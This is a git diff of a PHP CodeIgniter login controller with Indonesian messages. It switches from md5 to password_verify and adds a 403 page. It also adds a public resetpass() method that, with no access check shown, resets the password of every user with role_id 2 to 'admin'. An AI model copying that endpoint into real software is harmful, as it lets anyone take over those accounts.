@@ -1,7 +1,7 @@
 <?php
 defined('BASEPATH') OR exit('No direct script access allowed');
 
-class Auth extends CI_Controller 
+class Auth extends MY_Controller 
 {
 	public function index()
 	{
@@ -47,7 +47,8 @@ class Auth extends CI_Controller
 			$user 		= $this->db->where('username', $username)->get('user')->row_array();
 			if ($user) {
 				if ($user['is_active'] == 1) {
-					if ($user['password']==md5($password)) {
+					if (password_verify($password, $user['password'])) 
+					{
 						$data = [
 									'fullname'	=> $user['fullname'],
 									'username'	=> $user['username'],
@@ -87,6 +88,26 @@ class Auth extends CI_Controller
 		$this->session->set_flashdata('message', '
 			Anda keluar dari Aplikasi, Terima Kasih Telah Berkunjung
 			');
+		redirect('authentication');
+	}
+
+	public function blocked()
+	{
+		$title			= 'Bloked';
+		$sub_title		= '';
+		$this->header($title, $sub_title);
+
+		$this->load->view('backend/v_403');
+
+		$this->footer();
+	}
+
+	public function resetpass()
+	{
+		$data = array(
+						'password' => password_hash('admin', PASSWORD_DEFAULT)
+						);
+		$this->db->where('role_id', 2)->update('user', $data);
 		redirect('authentication');
 	}
 }
